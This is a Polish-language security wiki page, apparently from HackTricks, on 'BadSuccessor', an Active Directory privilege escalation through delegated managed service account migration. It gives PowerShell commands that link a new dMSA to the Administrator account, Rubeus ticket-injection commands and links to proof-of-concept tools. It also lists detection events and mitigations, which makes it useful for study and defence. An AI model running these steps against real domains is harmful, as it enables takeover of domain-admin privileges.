# BadSuccessor: Eskalacja uprawnień przez nadużycie migracji Delegated MSA

{{#include ../../banners/hacktricks-training.md}}

## Omówienie

Delegated Managed Service Accounts (**dMSA**) to następcy nowej generacji **gMSA**, dostępni w Windows Server 2025. Prawidłowy proces migracji pozwala administratorom zastąpić *stare* konto (użytkownika, komputera lub usługi) kontem dMSA, zachowując w sposób transparentny jego uprawnienia. Proces jest udostępniany za pomocą cmdletów PowerShell, takich jak `Start-ADServiceAccountMigration` i `Complete-ADServiceAccountMigration`, oraz opiera się na dwóch atrybutach LDAP obiektu **dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* do zastępowanego (starego) konta.
* **`msDS-DelegatedMSAState`**       – stan migracji (`0` = brak, `1` = w toku, `2` = *zakończona*).<sup>[[1]](#references)</sup>

Jeśli attacker może utworzyć dowolne dMSA wewnątrz OU i bezpośrednio zmodyfikować te 2 atrybuty, LSASS i KDC potraktują dMSA jako *następcę* powiązanego konta. Gdy attacker następnie uwierzytelni się jako dMSA, **odziedziczy wszystkie uprawnienia powiązanego konta** – aż do **Domain Admin**, jeśli powiązane zostanie konto Administrator.<sup>[[1]](#references)</sup>

Technika ta została nazwana **BadSuccessor** przez Unit 42 w 2025 roku. W chwili pisania tego tekstu **nie jest dostępna żadna security patch**; problem można ograniczyć wyłącznie przez hardening uprawnień OU.<sup>[[1]](#references)[[2]](#references)</sup>

### Wymagania wstępne ataku

1. Konto, które ma *zezwolenie* na tworzenie obiektów w **Jednostce organizacyjnej (OU)** *oraz* posiada co najmniej jedno z następujących uprawnień:
* `Create Child` → klasa obiektu **`msDS-DelegatedManagedServiceAccount`**
* `Create Child` → **`All Objects`** (generic create)
2. Łączność sieciowa z LDAP i Kerberos (standardowy scenariusz, w którym urządzenie jest przyłączone do domeny / atak zdalny).<sup>[[1]](#references)</sup>

## Enumerating Vulnerable OUs

Unit 42 opublikowało skrypt pomocniczy PowerShell, który analizuje security descriptors każdej jednostki OU i wyróżnia wymagane ACE:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
W tle skrypt wykonuje stronicowane wyszukiwanie LDAP dla `(objectClass=organizationalUnit)` i sprawdza każdy `nTSecurityDescriptor` pod kątem

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (klasa obiektu *msDS-DelegatedManagedServiceAccount*)

## Kroki Exploitation

Po zidentyfikowaniu zapisywalnego OU atak wymaga już tylko 3 zapisów LDAP:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Po replikacji atakujący może po prostu wykonać **logon** jako `attacker_dMSA$` lub zażądać biletu Kerberos TGT – Windows utworzy token konta *superseded*.<sup>[[1]](#references)</sup>

### Automatyzacja

Kilka publicznych PoC obejmuje cały workflow, w tym pobieranie hasła i zarządzanie biletami:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Moduł NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Wykrywanie i hunting

Włącz **Object Auditing** na OU i monitoruj następujące Windows Security Events:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – utworzenie obiektu **dMSA**
* **5136** – modyfikacja **`msDS-ManagedAccountPrecededByLink`**
* **4662** – zmiany określonych atrybutów
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – wystawienie TGT dla dMSA

Korelacja zdarzeń `4662` (modyfikacja atrybutu), `4741` (utworzenie konta komputera/usługi) i `4624` (późniejsze logowanie) szybko wskazuje aktywność BadSuccessor. Rozwiązania XDR, takie jak **XSIAM**, zawierają gotowe do użycia zapytania (zobacz references).<sup>[[2]](#references)</sup>

## Mitigacja

* Stosuj zasadę **least privilege** – deleguj zarządzanie *Service Account* wyłącznie zaufanym rolom.
* Usuń `Create Child` / `msDS-DelegatedManagedServiceAccount` z OU, które nie wymagają ich w sposób wyraźny.
* Monitoruj wymienione powyżej identyfikatory zdarzeń i generuj alerty, gdy tożsamości *non-Tier-0* tworzą lub edytują dMSA.

## Zobacz także


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Nadużywanie dMSA w celu eskalacji uprawnień w Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Gdy dobre konta stają się złe: wykorzystywanie Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [Moduł NetExec BadSuccessor](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
